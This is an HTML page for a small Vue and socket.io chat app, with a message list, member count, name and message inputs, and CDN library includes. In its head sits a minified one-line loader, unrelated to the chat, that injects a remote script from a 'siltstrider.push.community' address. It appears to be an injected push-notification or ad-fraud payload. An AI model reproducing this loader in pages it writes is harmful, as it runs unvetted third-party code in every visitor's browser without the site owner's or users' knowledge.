<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Chat</title>
    <link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet" />
    <link rel="stylesheet" href="style.css"/>
    <script>
    !function(p,u,s,h,m,e){p.__cmbk=p.__cmbk||function(){(p.__cmbk.q=p.__cmbk.q||[]).push(arguments)};m=u.createElement(s);e=u.getElementsByTagName(s)[0];m.async=!0;m.src=h;e.parentNode.insertBefore(m,e);}(window,document,'script','//siltstrider.push.community/js/integration.js');
</script>
</head>
<body>
    <div class="chat">
        <ul class="chat-list">
            <li v-for='(msg, index) in messages' :key="index" class="chat-list-item" v-bind:style="{backgroundColor: msg.color}">
               {{msg.text}}
            </li>
        </ul>

        <div class="membersCount">Members in chat: {{membersCount}}</div>
        <div class="msg-wrapper">
            <input type="text" v-model="message" v-on:keydown="send" placeholder="Type your message..." id="msg">
            <input type="text" v-model="name" v-on:keydown="setName" placeholder="Change your name..."  id="name" autocomplete="off">
            <div class="typing"><span class="type">{{typing}}</span></div>

        </div>
        <div class="empty"></div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.16/vue.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.0/socket.io.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="client.js"></script>
</body>
</html>
